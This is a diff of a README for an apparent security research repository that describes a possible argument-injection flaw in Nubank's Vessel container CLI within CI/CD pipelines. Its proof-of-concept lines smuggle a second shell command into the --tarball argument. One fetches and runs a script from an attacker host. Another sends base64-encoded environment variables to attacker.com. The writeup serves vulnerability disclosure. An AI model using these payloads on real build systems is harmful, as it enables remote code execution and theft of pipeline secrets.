@@ -1,24 +1,21 @@
-# vessel-security-research
-Remote Code Execution via Argument Injection in Nubank Vessel
+# Security Research: Argument Injection in Nubank Vessel
 
-Markdown
-# Security Research: Command Injection in Nubank Vessel
+## Overview
+This repository contains a security analysis of [Vessel](https://github.com/nubank/vessel), a container management tool by Nubank. The research focuses on how unsanitized CLI arguments can lead to **Command Injection** or **Remote Code Execution (RCE)** when integrated into automated pipelines.
 
-## Description
-This repository documents a potential Command Injection vulnerability in [Vessel](https://github.com/nubank/vessel), a container image management tool. The flaw allows an attacker to execute arbitrary commands by manipulating CLI arguments like `--tarball` or `--repository` when the tool interacts with a Docker Registry.
+## Target Analysis
+- **Project:** Vessel (Clojure-based CLI)
+- **Vulnerability:** Argument Injection / RCE
+- **Context:** CI/CD workflows (GitHub Actions)
 
-## Technical Details
-Vessel is written in **Clojure** and manages container manifests. During the audit, it was discovered that certain parameters are passed to underlying system processes without sufficient sanitization.
+## Technical Deep Dive
+Vessel processes container images by interacting with registries and local filesystems. During testing, it was identified that parameters like `--tarball` and `--repository` are handled in a way that allows shell metacharacters (`;`, `&`, `|`) to be interpreted by the underlying system.
 
-### Vulnerable Flow:
-1. User provides a malicious string as a `--tarball` argument: `; touch /tmp/pwned #`
-2. Vessel processes the command via its internal execution engine.
-3. The shell interprets the semicolon and executes the injected command.
-Impact
-If integrated into a CI/CD pipeline (as seen in .github/workflows/test.yaml), an attacker with control over image names or metadata could achieve Remote Code Execution (RCE) in the build environment.
 
-## Proof of Concept (Bash)
+
+### Potential Attack Vector
+If a CI/CD pipeline uses Vessel to push images based on dynamic input (e.g., branch names or pull request metadata), an attacker could trigger an RCE:
+
 ```bash
-# Example of potential exploitation via argument injection
-java -jar vessel.jar push --tarball "./dummy.tar; curl http://your-attacker-ip/shell | sh #" my-registry.nubank.com.br/audit-test
-
+# Payload example targeting a registry push
+java -jar vessel.jar push --tarball "./dummy.tar; curl [http://attacker.com/leak?data=$(env](http://attacker.com/leak?data=$(env) | base64) #" my-reg/repo
